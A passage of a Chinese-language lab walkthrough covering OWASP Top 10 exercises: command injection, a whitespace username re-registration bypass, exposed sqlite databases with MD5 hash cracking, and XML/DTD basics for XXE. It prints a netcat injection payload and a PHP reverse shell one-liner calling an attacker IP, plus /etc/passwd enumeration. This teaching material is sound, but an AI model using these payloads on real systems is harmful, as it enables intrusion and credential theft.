+<p>通过简单地执行payload <code>;nc -e /bin/bash</code>就可能获得目标web服务器的权限（注意：一些netcat命令的变体也可能不支持-e选项），你可以使用以下反向shell列表以及在线生成器作为替代方案：</p>
+<blockquote>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" >https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.revshells.com/" >https://www.revshells.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+</blockquote>
+<p>一旦攻击者在web服务器上获得立足点，他们就可以开始对目标操作系统进行常见的枚举操作，并能够尝试寻找可用于提权或者内网横向移动的方法。</p>
+<h2 id="严重程度TOP1-命令注入-练习"><a href="#严重程度TOP1-命令注入-练习" class="headerlink" title="[严重程度TOP1] 命令注入-练习"></a>[严重程度TOP1] 命令注入-练习</h2><p><strong>什么是主动命令注入？</strong></p>
+<p>当向服务器发出的系统命令未在 HTML 文档中给攻击者返回响应消息时，发生的可能是盲注类型的命令注入；而在主动命令注入攻击中，攻击者将收到对应的响应消息，目标站点可以通过多个 HTML 元素使响应消息对攻击者可见。</p>
+<p>让我们考虑一个场景：攻击者正在尝试建立基于 Web 的shell，但不小心将其暴露在 Internet 上，它还未完成，但如果目标网站存在命令注入漏洞，那么攻击者就可以利用该shell 并在目标网站的当前页面上看到来自系统调用的响应消息。</p>
+<p>让我们看看 evilshell.php 中的示例代码，看看它在做什么，以及为什么它会激活命令注入。</p>
+<p><em><strong>EvilShell (evilshell.php) Code Example</strong></em></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221201174453578.png"
+                      alt="image-20221201174453578"
+                ></p>
+<p>查看伪代码，上面的代码片段会执行以下操作：</p>
+<ol>
+<li>检查是否设置了参数“<em>commandString</em>”。</li>
+<li>如果设置了，则变量 <code>$command_string</code> 将获取传递到用户输入字段中的内容。</li>
+<li>然后程序将进入 try 块以执行函数<code>passthru($command_string)</code>。 你可以阅读有关<a class="link"   target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.passthru.php" >passthru() 的文档 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，它会执行对应变量所传递的内容，然后将输出结果直接传递回浏览器中的网站相关页面。</li>
+<li>如果 try 执行不成功，那么 catch 应该将错误消息输出到当前页面，但是这通常不会显示任何东西，因为在此处无法直接输出stderr(标准错误输出)，添加catch是因为PHP不允许我们在没有使用 catch 的情况下单独执行 try 。</li>
+</ol>
+<p><strong>检测主动命令注入的方法</strong></p>
+<p>当你可以看到系统调用的响应消息时，就说明发生了主动命令注入。在上面的代码中，函数<code>passthru()</code>会将响应消息直接传递给HTML文档，因此你可以在相关网页中看到你的命令注入payload的执行效果；正是因为基于这一点，所以我们可以通过输入一些有用的命令来尝试进一步枚举目标信息。对 <code>passthru()</code> 的函数调用可能并不总是在屏幕后发生，以上示例只是一个用来演示命令注入漏洞的简单方法。</p>
+<p><strong>可尝试执行的命令</strong></p>
+<p><strong>Linux</strong></p>
+<ul>
+<li>whoami</li>
+<li>id</li>
+<li>ifconfig&#x2F;ip addr</li>
+<li>uname -a</li>
+<li>ps -ef</li>
+</ul>
+<p><strong>Windows</strong></p>
+<ul>
+<li>whoami</li>
+<li>ver</li>
+<li>ipconfig</li>
+<li>tasklist</li>
+<li>netstat -an</li>
+</ul>
+<p>请导航至 <a class="link"   target="_blank" rel="noopener" href="http://machine_ip/evilshell.php" >http://MACHINE_IP/evilshell.php <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，以完成相关问题。</p>
+<p><strong>答题</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221201191620410.png"
+                      alt="image-20221201191620410"
+                ></p>
+<p>tips：MOTD-每日提示-message of the day</p>
+<p>启动目标机，在攻击机的浏览器中访问 <a class="link"   target="_blank" rel="noopener" href="http://10.10.163.228/evilshell.php" >http://10.10.163.228/evilshell.php <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>在攻击机上设置netcat监听器：</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221203184144289.png"
+                      alt="image-20221203184144289"
+                ></p>
+<p>在<a class="link"   target="_blank" rel="noopener" href="http://10.10.163.228/evilshell.php" >http://10.10.163.228/evilshell.php <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 页面使用反向shell命令：</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;10.14.32.186&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">反向shell备忘录：https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</span></span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221203184256414.png"
+                      alt="image-20221203184256414"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221203184333130.png"
+                      alt="image-20221203184333130"
+                ></p>
+<p><em><strong>通过攻击机的反向shell界面执行命令</strong></em></p>
+<p>使用<code>ls</code>命令：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221203184423876.png"
+                      alt="image-20221203184423876"
+                ></p>
+<p>使用<code>cat /etc/passwd</code>命令（查看non-root&#x2F;non-service&#x2F;non-daemon用户数目）：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221203184654131.png"
+                      alt="image-20221203184654131"
+                ></p>
+<p>使用<code>whoami</code>命令（查看当前用户名）：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221203184721887.png"
+                      alt="image-20221203184721887"
+                ></p>
+<p>使用<code>cat /etc/passwd</code>命令（查看当前用户名所对应的shell设置）：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221203184953287.png"
+                      alt="image-20221203184953287"
+                ></p>
+<p>使用<code>cat /etc/os-release</code>命令（查看操作系统版本）：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221203185142815.png"
+                      alt="image-20221203185142815"
+                ></p>
+<p>使用<code>cat /etc/update-motd.d/00-header</code>命令查看MOTD（message of the day-每日提示）中的隐藏信息：</p>
+<p>tips：<code>ls /etc/update-motd.d</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221203185553421.png"
+                      alt="image-20221203185553421"
+                ></p>
+<h2 id="严重程度TOP2-损坏的身份验证"><a href="#严重程度TOP2-损坏的身份验证" class="headerlink" title="[严重程度TOP2] 损坏的身份验证"></a>[严重程度TOP2] 损坏的身份验证</h2><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221203185812892.png"
+                      alt="image-20221203185812892"
+                ></p>
+<p>身份验证和会话(session)管理构成了现代 Web 应用程序的核心组件。身份验证允许用户通过验证其身份来访问 Web 应用程序，最常见的身份验证形式是使用用户名和密码机制。 用户需要输入密码凭据，然后服务器将验证它们是否正确，如果用户所提供的凭据是正确的，那么服务器将向用户的浏览器提供一个会话(session) cookie。之所以需要会话(session) cookie，是因为 Web 服务器将使用无状态的 HTTP(S)协议和客户端进行通信，通过附加会话 cookie 意味着服务器将知道是谁在发送什么数据，然后服务器就可以跟踪用户的操作。</p>
+<p>如果攻击者能够发现身份验证机制中的缺陷，他们就可以成功访问其他用户所对应的帐户，这将允许攻击者能够访问某些敏感数据（取决于应用程序的目的）。身份验证机制中的一些常见缺陷包括：</p>
+<ul>
+<li><p>暴力破解攻击：如果 Web 应用程序使用用户名和密码作为身份验证机制，攻击者可能会发起暴力破解攻击，该攻击将允许攻击者使用多次身份验证尝试来猜测用户名和密码，一旦破解成功攻击者就能非法通过身份验证机制。</p>
+</li>
+<li><p>使用弱凭证：Web 应用程序应设置强密码策略。 如果应用程序允许用户设置诸如“password1”或普通密码之类的弱验证凭据，那么攻击者就能够轻松猜解出这些凭据并实现对用户帐户的访问。</p>
+</li>
+<li><p>弱会话 Cookie：会话(Session) Cookie 是服务器跟踪用户操作的方式。 如果会话 cookie 包含的是一些可预测的值，那么攻击者就可以伪造会话 cookie 并实现对用户帐户的访问。</p>
+</li>
+</ul>
+<p>根据确切的身份验证机制缺陷，可以有多种针对损坏的身份验证机制的缓解措施：</p>
+<ul>
+<li><p>为防御密码猜测类型的攻击，请确保web应用程序执行强密码策略。</p>
+</li>
+<li><p>为防御暴力破解攻击，请确保web应用程序在一定次数的失败的验证尝试后 强制执行自动锁定操作，这将防止攻击者发起更多的暴力破解攻击尝试。</p>
+</li>
+<li><p>实施多因素身份验证——如果用户有多种身份验证方法，例如，使用用户名和密码机制并要求用户在其移动设备上接收短信代码等，那么攻击者将很难同时获得两种凭据以访问目标用户的帐户。</p>
+</li>
+</ul>
+<h2 id="严重程度TOP2-损坏的身份验证-练习"><a href="#严重程度TOP2-损坏的身份验证-练习" class="headerlink" title="[严重程度TOP2] 损坏的身份验证-练习"></a>[严重程度TOP2] 损坏的身份验证-练习</h2><p>本小节将通过一个示例以研究身份验证机制中的逻辑缺陷。</p>
+<p>当开发人员忘记清理用户在web应用程序代码中提供的输入（用户名和密码）时，可能会使目标web应用程序容易受到 SQL 注入等攻击。 但是，在此处我们将重点关注一个逻辑缺陷，即：关于现有用户的重新注册问题。</p>
+<p>例子：假设有一个名为 admin 的现有用户，现在我们想要访问admin帐户，我们可以尝试对用户名稍作修改并重新注册用户名，进入用户名注册页面：我们在用户名字段中输入“ admin”（注意此用户名开头含有空格），然后接着输入其他必需信息（如电子邮件ID或密码等）并提交该数据，该操作会注册一个新用户，但该用户将拥有与普通管理员相同的权限。通过登录新用户就能够看到admin用户权限下的相关内容。</p>
+<p>要查看实际效果，请访问 <a class="link"   target="_blank" rel="noopener" href="http://machine_ip:8888/" >http://MACHINE_IP:8888 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 并尝试注册一个名为 darren的用户，你会看到一个提示，告诉你该用户已经存在，我们继续尝试注册名为“ darren”的用户（注意此用户名开头含有空格），注册完成之后进行登录操作，我们就能看到 darren 帐户中的内容。</p>
+<p><strong>答题</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221203195339601.png"
+                      alt="image-20221203195339601"
+                ></p>
+<p>启动目标机，访问目标站点： <a class="link"   target="_blank" rel="noopener" href="http://10.10.116.78:8888/" >http://10.10.116.78:8888/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>注册名为“ darren”的用户（注意此用户名开头含有空格），登录新用户并查看flag内容：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221203200121330.png"
+                      alt="image-20221203200121330"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221203200241739.png"
+                      alt="image-20221203200241739"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221203200307678.png"
+                      alt="image-20221203200307678"
+                ></p>
+<p>注册名为“ arthur”的用户（注意此用户名开头含有空格），登录新用户并查看flag内容：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221203200404832.png"
+                      alt="image-20221203200404832"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221203200437726.png"
+                      alt="image-20221203200437726"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221203200502403.png"
+                      alt="image-20221203200502403"
+                ></p>
+<h2 id="严重程度TOP3-敏感信息泄露-介绍"><a href="#严重程度TOP3-敏感信息泄露-介绍" class="headerlink" title="[严重程度TOP3] 敏感信息泄露-介绍"></a>[严重程度TOP3] 敏感信息泄露-介绍</h2><p>当 web 应用程序意外泄露敏感数据时，我们将其称为“敏感数据泄露”，这些数据通常是与用户直接相关的数据（例如姓名、出生日期、财务信息等），但也可能是一些技术信息，例如用户名和密码。在更复杂的层面上，这通常涉及诸如“中间人攻击”之类的技术，攻击者将通过他们控制的设备强制用户连接，然后利用对任何传输数据的弱加密来获取对拦截信息的访问权限（如果数据首先经过了加密……）。当然，有些示例要简单得多，我们可以在 目标Web 应用程序中找到该类漏洞，而且无需任何高级网络知识即可利用这些漏洞。事实上，在某些情况下，敏感数据可以直接在web服务器相关的的网站页面上找到……</p>
+<h2 id="严重程度TOP3-敏感信息泄露-材料1"><a href="#严重程度TOP3-敏感信息泄露-材料1" class="headerlink" title="[严重程度TOP3] 敏感信息泄露-材料1"></a>[严重程度TOP3] 敏感信息泄露-材料1</h2><p>以一种可以同时从多个位置轻松访问的格式来存储大量数据的最常见方法是通过数据库。 这显然非常适合 Web 应用程序，因为可能会有许多用户在任意时间内与目标网站发生交互。 数据库引擎通常遵循结构化查询语言 (SQL-<strong>S</strong>tructured <strong>Q</strong>uery <strong>L</strong>anguage) 语法； 然而，一些替代方案（例如 NoSQL）也越来越受欢迎。</p>
+<p>在生产环境中，通常会看到在专用服务器上设置数据库，如运行 MySQL 或 MariaDB 等数据库服务；但是，数据库也可以被存储为文件形式，这些文件形式的数据库被称为“平面文件(flat-file)”数据库，因为它们是作为单个文件而存储在计算机上的。 使用“平面文件(flat-file)”比设置完整的数据库服务器要容易得多，因此可能会在较小的 Web 应用程序中看到。 </p>
+<p>如前所述，平面文件数据库是作为文件存储在计算机磁盘上的，这对于 Web 应用程序来说不会造成其他问题，但是如果将平面文件数据库存储在网站的根目录下（即连接到网站用户所能够访问的文件之一），将会发生什么情况呢？ 这将导致我们可以直接下载它到我们的本地机器上，并且可以完全访问对应的平面文件数据库中的所有内容，进而造成了敏感数据泄露！</p>
+<p>让我们简要介绍一些用于查询平面文件数据库的语法。</p>
+<p>最常见（也是最简单）的平面文件数据库格式是 sqlite 数据库，可以在大多数编程语言环境下进行交互，并且有一个专门的客户端可以在命令行上查询数据信息，这个客户端叫做“sqlite3”，在 Kali 中将默认安装。</p>
+<p>假设我们已经成功地下载了一个平面文件数据库：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221203223336491.png"
+                      alt="image-20221203223336491"
+                ></p>
+<p>我们可以看到在当前文件夹中有一个SQLite数据库文件。</p>
+<p>要访问它，我们可以使用：<code>sqlite3 &lt;database-name&gt;</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221203223516357.png"
+                      alt="image-20221203223516357"
+                ></p>
+<p>然后我们可以接着查看数据库中的表，通过使用命令<code>.tables</code>：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221203223657467.png"
+                      alt="image-20221203223657467"
+                ></p>
+<p>此时我们可以转储该表中的所有数据，但在转储数据之前，我们还需要先查看表的相关信息，否则我们不一定知道表中每一列的具体含义。 </p>
+<p>首先使用<code>PRAGMA table_info(customers);</code>查看表信息，然后使用<code>SELECT * FROM customers;</code>转储该表中的信息：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221203224039023.png"
+                      alt="image-20221203224039023"
+                ></p>
+<p>我们从表信息中可以看出，此表一共有四列：<code>custID</code>、<code>custName</code>、<code>creditCard</code>和<code>password</code>。 你可能会注意到这与查询该表的结果相符。</p>
+<p>取第一行：</p>
+<blockquote>
+<p>0|Joy Paulson|4916 9012 2231 7905|5f4dcc3b5aa765d61d8327deb882cf99</p>
+</blockquote>
+<p>我们能够得知数据信息 custID (0)、custName (Joy Paulson)、creditCard (4916 9012 2231 7905) 和密码哈希值 (5f4dcc3b5aa765d61d8327deb882cf99)。</p>
+<p>在下一小节中，我们将着眼于破解这个哈希值。</p>
+<h2 id="严重程度TOP3-敏感信息泄露-材料2"><a href="#严重程度TOP3-敏感信息泄露-材料2" class="headerlink" title="[严重程度TOP3] 敏感信息泄露-材料2"></a>[严重程度TOP3] 敏感信息泄露-材料2</h2><p>在上一个小节中，我们了解了如何查询 SQLite 数据库中的敏感数据，并且找到了一些密码哈希值(每个用户都有一个)。 在本小节中，我们将简要介绍如何破解这些密码哈希值。</p>
+<p>在哈希破解方面，Kali 预装了各种工具——如果你知道如何使用这些工具，请随意使用即可。</p>
+<p>在本小节中我们将使用在线工具进行hash破解工作：<a class="link"   target="_blank" rel="noopener" href="https://crackstation.net/" >Crackstation <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。Crackstation网站非常擅长破解弱密码的哈希值，而对于更复杂的哈希，我们则需要使用其他工具来进行破解； 例子中的所有可破解的密码哈希值都是弱密码的 MD5 哈希值，所以我们直接使用Crackstation在线破解即可。</p>
+<p>当我们导航到Crackstation网站时，我们会看到以下界面：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221203225245851.png"
+                      alt="image-20221203225245851"
+                ></p>
+<p>粘贴我们在上一小节中找到的 Joy Paulson 的密码哈希值(<code>5f4dcc3b5aa765d61d8327deb882cf99</code>) ，勾选验证码，然后点击“破解哈希”按钮即可：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221203225511295.png"
+                      alt="image-20221203225511295"
+                ></p>
+<p>我们看到哈希值被成功破解，目标用户的密码是“password”！</p>
+<p>注意：Crackstation 网站在破解hash时，将使用很大的字典，如果哈希值所对应的密码确实不在字典中，那么 Crackstation 将无法破解该哈希值。</p>
+<h2 id="严重程度TOP3-敏感信息泄露-练习"><a href="#严重程度TOP3-敏感信息泄露-练习" class="headerlink" title="[严重程度TOP3] 敏感信息泄露-练习"></a>[严重程度TOP3] 敏感信息泄露-练习</h2><p>启动目标机器，回答知识点相关问题！</p>
+<p><strong>答题</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221203230018507.png"
+                      alt="image-20221203230018507"
+                ></p>
+<p>启动目标机器，访问目标站点，查看login网页的页面源代码，可以看到作者留下的一些评论，告诉我们 &#x2F;assets 中有一个数据库文件：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221204191557968.png"
+                      alt="image-20221204191557968"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221204191855964.png"
+                      alt="image-20221204191855964"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221204191939098.png"
+                      alt="image-20221204191939098"
+                ></p>
+<p>通过浏览器的url地址栏 导航到 &#x2F;assets ，找到数据库文件（点击文件即可下载到攻击机上）：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221204192050796.png"
+                      alt="image-20221204192050796"
+                ></p>
+<p>通过浏览器下载数据库文件，然后在攻击机终端使用命令<code>ls</code>和<code>file webapp.db</code>（验证所下载的文件是否为数据库文件）：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221204192411223.png"
+                      alt="image-20221204192411223"
+                ></p>
+<p>使用命令<code>sqlitebrowser webapp.db</code>通过使用可视化客户端打开数据库文件，查看用户表中的敏感信息：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221204192733787.png"
+                      alt="image-20221204192733787"
+                ></p>
+<p>使用以下网站，进行在线hash破解操作：</p>
+<blockquote>
+<p><a class="link"   target="_blank" rel="noopener" href="https://crackstation.net/" >https://crackstation.net/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://hashes.com/en/decrypt/hash" >https://hashes.com/en/decrypt/hash <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221204192841587.png"
+                      alt="image-20221204192841587"
+                ></p>
+<p>使用刚才得到的明文密码信息以admin用户身份登录目标站点，查看flag内容：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221204193007000.png"
+                      alt="image-20221204193007000"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221204193046169.png"
+                      alt="image-20221204193046169"
+                ></p>
+<blockquote>
+<p>THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl} 。</p>
+</blockquote>
+<h2 id="严重程度TOP4-XML-外部实体注入（XXE漏洞）"><a href="#严重程度TOP4-XML-外部实体注入（XXE漏洞）" class="headerlink" title="[严重程度TOP4] XML 外部实体注入（XXE漏洞）"></a>[严重程度TOP4] XML 外部实体注入（XXE漏洞）</h2><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221204193850941.png"
+                      alt="image-20221204193850941"
+                ></p>
+<p>XML 外部实体 (XXE) 注入是一种滥用 XML 解析器&#x2F;数据 功能的漏洞。它通常允许攻击者与应用程序本身可以访问的任何后端或外部系统进行交互，并且可以允许攻击者读取该系统上的文件，XXE还可以导致拒绝服务 (DoS-Denial of Service) 攻击，或者可以使用 XXE 执行服务器端请求伪造 (SSRF)，诱导 Web 应用程序向其他应用程序发出请求。 XXE甚至能够进行端口扫描以及导致远程代码执行。</p>
+<p>XXE 攻击有两种类型：带内(in-band)和带外 (out-of-band)，带外的XXE可简写为OOB-XXE。</p>
+<p>1.在带内 XXE 攻击中，攻击者可以立即收到web应用程序对 XXE payload的响应。</p>
+<p>2.在带外 XXE 攻击（也可称为盲注类型的 XXE）中，Web 应用程序不会立即响应XXE payload，攻击者必须将XXE payload对应的响应输出反映到其他文件中或攻击者所控制的服务器上。</p>
+<h2 id="严重程度TOP4-XXE漏洞-XML可扩展标记性语言"><a href="#严重程度TOP4-XXE漏洞-XML可扩展标记性语言" class="headerlink" title="[严重程度TOP4] XXE漏洞-XML可扩展标记性语言"></a>[严重程度TOP4] XXE漏洞-XML可扩展标记性语言</h2><p>在我们继续学习如何利用XXE 漏洞之前，我们必须正确理解 XML 的概念。</p>
+<p><strong>什么是XML？</strong></p>
+<p>XML（eXtensible Markup Language-可扩展标记语言）是一种标记语言，它定义了一组规则，用于以人工可读和机器可读的格式对文档进行编码处理，XML是一种用于存储和传输数据的标记语言。</p>
+<p><strong>为什么要使用XML？</strong></p>
+<p>1.XML 是独立于平台和编程语言的，因此它可以在任何系统上使用，并能支持IT技术变更的情况。</p>
+<p>2.使用 XML 存储和传输的数据可以在任何时间点更改，且不会影响数据表示。</p>
+<p>3.XML 允许使用 DTD 和Schema(模式)进行内容验证，此验证可确保 XML 文档没有任何语法错误。</p>
+<p>4.由于XML独立于平台的特性，它简化了各种系统之间的数据共享，因为XML数据在不同系统之间传输时 不需要进行任何转换处理。</p>
+<p><strong>语法</strong></p>
+<p>每个 XML 文档大多以 XML Prolog 开头：</p>
+<p><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</code></p>
+<p>上面一行被称为 XML 序言(prolog )，它将指定 XML 版本和 XML 文档中所使用的编码类型，该行不是强制使用的，但将这一行放在所有 XML 文档的开头被认为是一种“良好做法”。</p>
+<p>每个 XML 文档都必须包含一个“ROOT”元素，例如：</p>
+<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mail</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">to</span>&gt;</span>falcon<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">from</span>&gt;</span>feast<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">subject</span>&gt;</span>About XXE<span class="tag">&lt;/<span class="name">subject</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">text</span>&gt;</span>Teach about XXE<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mail</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>在上面的示例中，<code>&lt;mail&gt;</code> 是该文档的 ROOT 元素，<code>&lt;to&gt;</code>、<code>&lt;from&gt;</code>、<code>&lt;subject&gt;</code>、<code>&lt;text&gt;</code> 是子元素。 如果一个 XML 文档没有任何根元素，那么它将被认为是错误的或无效的 XML 文档。</p>
+<p>另一件要记住的事情是 XML 是一种区分大小写的语言：如果标签以 <code>&lt;to&gt;</code> 开头，那么它必须以 <code>&lt;/to&gt;</code> 结尾，而不能以 <code>&lt;/To&gt;</code> （大写T ）结尾。</p>
+<p>与 HTML 一样，我们也可以在 XML 中使用属性(attributes )，XML中关于属性的语法也与 HTML 非常相似，例如：</p>
+<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">text</span> <span class="attr">category</span> = <span class="string">&quot;message&quot;</span>&gt;</span>You need to learn about XXE<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>tips：category英文翻译为–类别</p>
+<p>在上面的示例中，category 是属性名称，message 是属性值。</p>
+<p><strong>答题</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221204223418751.png"
+                      alt="image-20221204223418751"
+                ></p>
+<h2 id="严重程度TOP4-XXE漏洞-DTD概念"><a href="#严重程度TOP4-XXE漏洞-DTD概念" class="headerlink" title="[严重程度TOP4] XXE漏洞-DTD概念"></a>[严重程度TOP4] XXE漏洞-DTD概念</h2><p>在继续学习 XXE 之前，我们必须了解什么是XML中的 DTD 。</p>
+<p>DTD 代表文档类型定义(Document Type Definition)，DTD将定义一个XML 文档的结构以及合法元素和属性(attributes )。</p>
+<p>让我们试着借助一个例子来理解这一点，假设我们有一个名为 <em><strong>note.dtd</strong></em> 的文件，其中包含以下内容：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE note [ &lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!ELEMENT to (#PCDATA)&gt; &lt;!ELEMENT from (#PCDATA)&gt; &lt;!ELEMENT heading (#PCDATA)&gt; &lt;!ELEMENT body (#PCDATA)&gt; ]&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>现在我们可以使用这个 DTD 来验证一些 XML 文档的信息，并确保 XML 文件符合该 DTD 所描述的规则。<br>例如：下面给出了一个使用 <em><strong>note.dtd</strong></em> 的 XML 文档</p>
+<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;note.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>falcon<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">from</span>&gt;</span>feast<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">heading</span>&gt;</span>hacking<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span>XXE attack<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
